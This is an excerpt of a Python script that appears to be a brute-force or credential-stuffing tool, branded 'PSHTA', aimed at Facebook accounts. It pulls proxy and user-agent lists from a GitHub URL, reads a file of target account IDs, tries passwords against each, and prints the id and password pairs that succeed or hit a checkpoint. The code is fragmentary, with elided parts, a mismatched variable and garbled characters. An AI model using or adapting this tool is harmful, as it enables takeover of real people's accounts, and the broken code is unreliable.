...
try:
	instead= requests.get('https://raw.githubusercontent.com/Pshta01/Api/main/Usar-Agent1').text
	open('.Usar-Agent1.txt','w').write(prox)
except Exception as e:
	prox=open('.Usar-Agent1.txt','r').read().splitlines()




try:
	prox = requests.get('https://raw.githubusercontent.com/Pshta01/Api/blob/main/prox.txt').text
...
def alvino_xy(u):
        for e in u + "\m" +"\kk" +"\p" +"\h":sys.stdout.write(e);sys.stdout.flush()
def clear():
	os.system("clear")
def back():
	login()
def banner():
	clear()
	print(f""" \33[1;96m + \033[32m + \033[34m
 ########   ######  ##     ## ########    ###    
 ##     ## ##    ## ##     ##    ##      ## ##   
 ##     ## ##       ##     ##    ##     ##   ##  
 ########   ######  #########    ##    ##     ## 
...
def FILE():
			...
			try:
				print('')
				print('')
				print('        \033[1;37m👇INPUT FILE👇          ')
				print('')
				fileX = input (' \033[1;37mFILE DABNE = ');os.system('clear');banner()
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit(" \033[1;37mFILE HALAYA [!]"%(fileX))
def setting():
	os.system('clear')
	banner()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \033[1;31m[\033[1;31mPSHTA]   {P}{H}{loop} \033[1;34m{P}{P}{H}=\033[1;34m {ok}\033[1;34m{P} \033[1;34m "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;37m [ PSHTA-CP ]\033[1;37m  {idf}\033[1;37m |\033[1;37m {pw}')
				...
				print(f'\r\033[1;34m [ PSHTA-OK ]\033[1;34m  {idf} \033[1;34m| \033[1;34m{pw}')
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%sâ•°â”€>Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%sâ•°â”€>%s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
